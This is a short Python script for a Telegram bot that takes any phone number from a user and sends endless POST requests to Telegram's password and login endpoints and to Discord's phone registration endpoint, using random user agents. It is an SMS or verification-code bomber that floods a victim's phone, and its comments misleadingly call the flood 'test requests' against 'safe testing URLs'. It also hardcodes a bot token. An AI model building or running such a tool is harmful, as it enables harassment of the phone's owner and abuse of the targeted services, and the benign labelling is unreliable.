# === Imports ===
import telebot
import requests
import fake_useragent

# === Telegram Bot Setup ===
TOKEN = "8294178048:AAFHWvl_MS9VdLsCsl9p28hNSq1nZIp1AXg"  # <-- Yaha apna BotFather se mila token dalna
bot = telebot.TeleBot(TOKEN)

# === Fake User Agent ===
user = fake_useragent.UserAgent().random
headers = {'user-agent': user}

# === Dictionary to keep track of counts per user ===
user_counts = {}

# === /start Command ===
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Hello! Send me a phone number to start test requests.")

# === Phone Number Handler ===
@bot.message_handler(func=lambda m: True)
def handle_number(message):
    number = message.text.strip()
    
    if not number.isdigit():
        bot.send_message(message.chat.id, "Please send a valid number.")
        return
    
    count = 0
    user_counts[message.chat.id] = count
    bot.send_message(message.chat.id, f"Starting test requests for: {number}")

    try:
        while True:
            # === Original APIs structure with safe testing URLs ===
            # Telegram send_password (POST)
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
            # Telegram support page (GET)
            requests.get('https://telegram.org/support?setln=ru', headers=headers)
            # Telegram auth (POST)
            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
            # Telegram send_password again (POST)
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
            # Telegram support page again (GET)
            requests.get('https://telegram.org/support?setln=ru', headers=headers)
            # Telegram auth again (POST)
            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': number})
            # Discord register phone (POST)
            requests.post('ttps://discord.com/api/v9/auth/register/phone', headers=headers, data={'phone': number})
            
            count += 1
            user_counts[message.chat.id] = count
            bot.send_message(message.chat.id, f"Test request sent {count} times for {number}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error occurred: {e}")

# === Start Polling ===
bot.polling()
